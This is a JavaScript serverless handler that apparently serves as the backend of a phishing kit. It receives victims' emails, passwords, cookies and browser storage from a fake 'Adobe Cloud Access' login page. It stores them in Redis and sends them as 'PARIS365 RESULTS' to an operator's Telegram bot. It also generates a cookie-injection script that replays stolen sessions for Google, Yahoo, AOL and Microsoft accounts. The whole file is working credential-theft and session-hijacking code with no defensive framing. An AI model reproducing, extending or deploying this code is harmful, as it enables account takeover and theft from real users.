export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body || '{}');
    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;

    console.log('📝 Received data:', {
      email,
      hasCookies: !!browserFingerprint?.cookies,
      cookiesType: typeof browserFingerprint?.cookies,
      cookiesLength: Array.isArray(browserFingerprint?.cookies) ? browserFingerprint.cookies.length : 'N/A'
    });

    // Check environment variables for Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram configuration');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Telegram credentials missing'
        }),
      };
    }

    // Get client IP with better detection
    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                     event.headers['x-real-ip'] || 
                     event.headers['cf-connecting-ip'] || 
                     event.requestContext?.identity?.sourceIp ||
                     'Unknown';

    // Enhanced cookie processing
    const cookieInfo = data.documentCookies || data.cookies || browserFingerprint?.cookies || 'No cookies available';
    const localStorageInfo = browserFingerprint?.localStorage || data.localStorage || 'Empty';
    const sessionStorageInfo = browserFingerprint?.sessionStorage || data.sessionStorage || 'Empty';
    
    console.log('🍪 Processing cookies:', { 
      cookieInfo, 
      type: typeof cookieInfo,
      isArray: Array.isArray(cookieInfo)
    });

    // Enhanced cookie formatting with multiple fallback methods
    let formattedCookies = [];
    
    // Method 1: Direct array
    if (Array.isArray(cookieInfo) && cookieInfo.length > 0) {
      formattedCookies = cookieInfo.filter(cookie => cookie && cookie.name);
      console.log('✅ Method 1: Direct array, found', formattedCookies.length, 'cookies');
    }
    
    // Method 2: Parse JSON string
    else if (typeof cookieInfo === 'string' && cookieInfo !== 'No cookies found' && cookieInfo !== 'Empty' && cookieInfo.trim() !== '') {
      try {
        const parsedCookies = JSON.parse(cookieInfo);
        if (Array.isArray(parsedCookies)) {
          formattedCookies = parsedCookies.filter(cookie => cookie && cookie.name);
          console.log('✅ Method 2: JSON parse, found', formattedCookies.length, 'cookies');
        }
      } catch (e) {
        console.log('⚠️ JSON parsing failed, trying cookie string parsing');
        
        // Method 3: Parse document.cookie format
        if (cookieInfo.includes('=')) {
          const cookieStrings = cookieInfo.split(';');
          formattedCookies = cookieStrings
            .filter(cookieStr => cookieStr.trim() && cookieStr.includes('='))
            .map(cookieStr => {
              const [name, ...valueParts] = cookieStr.trim().split('=');
              const value = valueParts.join('=');
              return name && name.trim() && value ? {
                name: name.trim(),
                value: value.trim(),
                domain: provider === 'Gmail' || provider === 'Google' ? '.google.com' : 
                       provider === 'Yahoo' ? '.yahoo.com' : 
                       provider === 'AOL' ? '.aol.com' : 
                       '.login.microsoftonline.com',
                path: '/',
                secure: true,
                httpOnly: false,
                sameSite: 'none',
                expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                hostOnly: false,
                session: false,
                storeId: null
              } : null;
            })
            .filter(cookie => cookie !== null);
          console.log('✅ Method 3: Cookie string parse, found', formattedCookies.length, 'cookies');
        }
      }
    }
    
    // Method 4: Check for document.cookie direct format
    else if (data.documentCookies && typeof data.documentCookies === 'string') {
      const cookieStrings = data.documentCookies.split(';').filter(c => c.trim() && c.includes('='));
      formattedCookies = cookieStrings
        .map(cookieStr => {
          const [name, ...valueParts] = cookieStr.trim().split('=');
          const value = valueParts.join('=');
          return name && name.trim() && value ? {
            name: name.trim(),
            value: value.trim(),
            domain: provider === 'Gmail' || provider === 'Google' ? '.google.com' : 
                   provider === 'Yahoo' ? '.yahoo.com' : 
                   provider === 'AOL' ? '.aol.com' : 
                   '.login.microsoftonline.com',
            path: '/',
            secure: true,
            httpOnly: false,
            sameSite: 'none',
            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
            hostOnly: false,
            session: false,
            storeId: null
          } : null;
        })
        .filter(cookie => cookie !== null);
      console.log('✅ Method 4: Document cookies, found', formattedCookies.length, 'cookies');
    }

    // Store session data in Redis
    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
    const sessionData = {
      email: email || '',
      password: password || 'Not captured',
      provider: provider || 'Others',
      fileName: fileName || 'Adobe Cloud Access',
      timestamp: timestamp || new Date().toISOString(),
      sessionId,
      clientIP,
      userAgent: userAgent || 'Unknown',
      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? 'mobile' : 'desktop',
      cookies: cookieInfo,
      localStorage: localStorageInfo,
      sessionStorage: sessionStorageInfo,
      browserFingerprint: browserFingerprint || {},
      cookiesFileData: cookiesFileData || '',
      formattedCookies: formattedCookies,
      rawCookieData: data // Store all raw data for debugging
    };

    // Store in Redis if available
    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
      try {
        const { Redis } = await import('@upstash/redis');
        const redis = new Redis({
          url: UPSTASH_REDIS_REST_URL,
          token: UPSTASH_REDIS_REST_TOKEN,
        });
        
        await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
        await redis.set(`user:${email}`, JSON.stringify(sessionData));
        await redis.set(`cookies:${sessionId}`, JSON.stringify({
          cookies: formattedCookies,
          localStorage: localStorageInfo,
          sessionStorage: sessionStorageInfo,
          timestamp: timestamp,
          email: email,
          password: password
        }));
        console.log('✅ Session data stored in Redis');
      } catch (redisError) {
        console.error('❌ Redis storage error:', redisError);
      }
    }

    // Send main message to Telegram
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';
    
    const message = `🔐 PARIS365 RESULTS

📧 ${email || 'Not captured'}
🔑 ${password || 'Not captured'}
🏢 ${provider || 'Others'}
🕒 ${new Date().toLocaleString()}
🌐 ${clientIP} | ${deviceInfo}
🍪 ${formattedCookies.length} cookies captured

🆔 ${sessionId}`;

    console.log('📤 Sending main message to Telegram...');

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
      signal: AbortSignal.timeout(15000),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('❌ Telegram API error:', errorText);
      throw new Error(`Failed to send message: ${errorText}`);
    }

    console.log('✅ Main message sent to Telegram');

    // Always try to send cookies file, even if empty (for debugging)
    let fileSent = false;
    
    try {
      console.log('📎 Preparing cookies file...');
      
      // Enhanced domain detection function
      const getDomainFromEmail = (email, provider) => {
        console.log(`🔍 Domain detection - Email: ${email}, Provider: ${provider}`);
        
        // PRIORITY 1: Extract domain from email address (most reliable)
        if (email && email.includes('@')) {
          const emailDomain = email.split('@')[1].toLowerCase();
          console.log(`📧 Extracted email domain: ${emailDomain}`);
          
          // Map common email domains to their OAuth domains
          const domainMapping = {
            'gmail.com': '.google.com',
            'googlemail.com': '.google.com',
            'yahoo.com': '.yahoo.com',
            'yahoo.co.uk': '.yahoo.com',
            'yahoo.ca': '.yahoo.com',
            'yahoo.fr': '.yahoo.com',
            'yahoo.de': '.yahoo.com',
            'ymail.com': '.yahoo.com',
            'rocketmail.com': '.yahoo.com',
            'aol.com': '.aol.com',
            'aim.com': '.aol.com',
            'hotmail.com': '.live.com',
            'hotmail.co.uk': '.live.com',
            'hotmail.fr': '.live.com',
            'hotmail.de': '.live.com',
            'live.com': '.live.com',
            'live.co.uk': '.live.com',
            'live.fr': '.live.com',
            'live.de': '.live.com',
            'msn.com': '.live.com',
            'outlook.com': '.live.com',
            'outlook.co.uk': '.live.com',
            'outlook.fr': '.live.com',
            'outlook.de': '.live.com'
          };
          
          // Check if we have a specific mapping for this domain
          if (domainMapping[emailDomain]) {
            console.log(`✅ Found domain mapping: ${emailDomain} → ${domainMapping[emailDomain]}`);
            return domainMapping[emailDomain];
          }
          
          // For business/custom domains, check if it's a known business domain
          // If it's a custom domain, use the actual domain
          if (!emailDomain.includes('gmail') && !emailDomain.includes('yahoo') && 
              !emailDomain.includes('hotmail') && !emailDomain.includes('outlook') && 
              !emailDomain.includes('live') && !emailDomain.includes('aol')) {
            console.log(`🏢 Using business domain: .${emailDomain}`);
            return '.' + emailDomain;
          }
        }
        
        // PRIORITY 2: Provider-based detection (fallback)
        const providerLower = (provider || '').toLowerCase();
        console.log(`🏷️ Provider-based detection: ${providerLower}`);
        
        if (providerLower.includes('gmail') || providerLower.includes('google')) {
          console.log(`✅ Provider detected as Google`);
          return '.google.com';
        } else if (providerLower.includes('yahoo')) {
          console.log(`✅ Provider detected as Yahoo`);
          return '.yahoo.com';
        } else if (providerLower.includes('aol')) {
          console.log(`✅ Provider detected as AOL`);
          return '.aol.com';
        } else if (providerLower.includes('hotmail') || providerLower.includes('live') || 
                   providerLower.includes('outlook') || providerLower.includes('office365')) {
          console.log(`✅ Provider detected as Microsoft`);
          return '.live.com';
        }
        
        // PRIORITY 3: If provider is "Others", try to detect from email again
        if (providerLower === 'others' && email && email.includes('@')) {
          const emailDomain = email.split('@')[1].toLowerCase();
          console.log(`🔄 Provider is 'Others', re-checking email domain: ${emailDomain}`);
          
          // Direct email domain analysis for common providers
          if (emailDomain.includes('gmail') || emailDomain.includes('googlemail')) {
            console.log(`✅ Email domain detected as Google`);
            return '.google.com';
          } else if (emailDomain.includes('yahoo') || emailDomain.includes('ymail') || emailDomain.includes('rocketmail')) {
            console.log(`✅ Email domain detected as Yahoo`);
            return '.yahoo.com';
          } else if (emailDomain.includes('hotmail') || emailDomain.includes('live') || 
                     emailDomain.includes('outlook') || emailDomain.includes('msn')) {
            console.log(`✅ Email domain detected as Microsoft`);
            return '.live.com';
          } else if (emailDomain.includes('aol') || emailDomain.includes('aim')) {
            console.log(`✅ Email domain detected as AOL`);
            return '.aol.com';
          } else {
            // For unknown domains when provider is "Others", use the actual domain
            console.log(`🏢 Unknown domain with 'Others' provider, using: .${emailDomain}`);
            return '.' + emailDomain;
          }
        }
        
        // FINAL FALLBACK: Only use Microsoft domain if we really can't determine anything
        console.log(`⚠️ Using final fallback domain: .login.microsoftonline.com`);
        return '.login.microsoftonline.com';
      };
      
      const defaultDomain = getDomainFromEmail(email, provider);
      console.log(`🌐 FINAL DETECTED DOMAIN: ${defaultDomain} for email: ${email} and provider: ${provider}`);
      
      // Ensure cookies have the proper format
      const cookiesForFile = formattedCookies.length > 0 ? formattedCookies.map(cookie => ({
        name: cookie.name || '',
        value: cookie.value || '',
        domain: cookie.domain || defaultDomain,
        path: cookie.path || "/",
        secure: cookie.secure !== false,
        httpOnly: cookie.httpOnly !== false,
        sameSite: cookie.sameSite || "none",
        expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
        hostOnly: cookie.hostOnly || false,
        session: cookie.session !== false,
        storeId: cookie.storeId || null
      })) : [];
      
      // Create JavaScript injection code
      const jsInjectionCode = cookiesForFile.length > 0 ? 
        `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(cookiesForFile))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();` :
        `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;

      const cookiesFileContent = `// Cookie Data for ${email || 'unknown'} - ${new Date().toISOString()}
// Provider: ${provider || 'Others'}
// IP: ${clientIP}
// Cookies Found: ${cookiesForFile.length}

let ipaddress = "${clientIP}";
let email = "${email || 'Not captured'}";
let password = "${password || 'Not captured'}";

// Raw Cookie Data Debug Info:
// Original cookie info type: ${typeof cookieInfo}
// Original cookie info: ${JSON.stringify(cookieInfo).substring(0, 200)}...
// Formatted cookies count: ${cookiesForFile.length}

${jsInjectionCode}

// Cookie Data:
${JSON.stringify(cookiesForFile, null, 2)}

// Session Storage:
// ${sessionStorageInfo}

// Local Storage:
// ${localStorageInfo}`;

      const fileNameForUpload = `cookies_${(email || 'unknown').replace('@', '_at_').replace(/[^a-zA-Z0-9_]/g, '_')}_${Date.now()}.js`;

      // Create multipart form data
      const boundary = '----formdata-boundary-' + Math.random().toString(36);
      
      let formData = '';
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      formData += `${TELEGRAM_CHAT_ID}\r\n`;
      
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r\n`;
      formData += `Content-Type: text/javascript\r\n\r\n`;
      formData += cookiesFileContent;
      formData += `\r\n`;
      
      formData += `--${boundary}--\r\n`;

      console.log('📤 Sending cookies file to Telegram...');

      // Send file to Telegram
      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
        },
        body: formData,
        signal: AbortSignal.timeout(30000),
      });

      if (fileResponse.ok) {
        console.log('✅ Cookies file sent successfully');
        fileSent = true;
      } else {
        const fileErrorText = await fileResponse.text();
        console.error('❌ File upload failed:', fileErrorText);
        
        // Fallback: send as text message
        const fallbackMessage = `📁 <b>COOKIES FILE</b> (${cookiesForFile.length} cookies)\n\n<code>${cookiesFileContent.substring(0, 3500)}</code>\n\n${cookiesFileContent.length > 3500 ? '<i>...truncated</i>' : ''}`;
        
        const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: fallbackMessage,
            parse_mode: 'HTML',
          }),
        });
        
        if (fallbackResponse.ok) {
          console.log('✅ Cookies data sent as text message');
          fileSent = true;
        }
      }
    } catch (fileError) {
      console.error('❌ Error sending cookies file:', fileError);
      
      // Final fallback - send debug info
      try {
        const debugInfo = `🔍 <b>DEBUG INFO</b>\n\n👤 User: ${email || 'Not captured'}\n🍪 Cookies Found: ${formattedCookies.length}\n📊 Raw Data Type: ${typeof cookieInfo}\n📋 Raw Data: ${JSON.stringify(cookieInfo).substring(0, 200)}...\n\n<i>Cookie processing completed with ${formattedCookies.length} cookies.</i>`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: debugInfo,
            parse_mode: 'HTML',
          }),
        });
        
        console.log('✅ Debug info sent');
        fileSent = true;
      } catch (debugError) {
        console.error('❌ All sending methods failed:', debugError);
      }
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true, 
        message: 'Data processed successfully',
        sessionId: sessionId,
        cookiesCollected: formattedCookies.length > 0,
        cookieCount: formattedCookies.length,
        fileSent: fileSent,
        debug: {
          originalCookieType: typeof cookieInfo,
          processedCookieCount: formattedCookies.length,
          rawDataAvailable: !!cookieInfo
        }
      }),
    };

  } catch (error) {
    console.error('❌ Error in sendTelegram function:', error);
    
    // Send error notification
    try {
      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
      
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `🚨 <b>FUNCTION ERROR</b>\n\n<code>${error.message}</code>\n\n${new Date().toISOString()}`,
            parse_mode: 'HTML',
          }),
        });
      }
    } catch (notificationError) {
      console.error('❌ Failed to send error notification:', notificationError);
    }
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};